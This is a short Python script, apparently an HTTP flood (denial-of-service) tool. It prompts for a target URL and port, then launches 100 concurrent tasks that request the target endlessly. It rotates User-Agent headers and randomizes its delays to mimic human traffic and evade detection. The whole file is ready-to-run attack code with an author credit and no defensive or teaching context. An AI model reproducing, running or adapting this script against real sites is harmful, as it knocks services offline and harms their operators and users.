import aiohttp
import asyncio
import random
import time
from termcolor import colored  # To print colored text in the terminal

# Display the message at the top when the script runs
print("Made by Mohimanul - The Virtual Myst\n")

# Rotating User-Agent strings
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
]

# Prompt user to enter the target URL and port
target_url = input("Enter the target URL (e.g., http://example.com): ")
port = input("Enter the port (e.g., 80 or 443): ")

# Construct the full target URL with port
full_url = f"{target_url}:{port}"

async def attack(session, url):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),  # Randomly choose a User-Agent
                "Accept": "text/html",
                "Connection": "keep-alive"
            }
            async with session.get(url, headers=headers, timeout=10) as response:
                # Print "Packet sent" in green color after each successful request
                print(colored(f"Packet sent: {response.status}", "green"))
        except Exception as e:
            print(f"Error: {e}")
        await asyncio.sleep(random.uniform(0.1, 0.5))  # Slight delay to mimic human traffic

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [attack(session, full_url) for _ in range(100)]  # 100 concurrent tasks
        await asyncio.gather(*tasks)

asyncio.run(main())
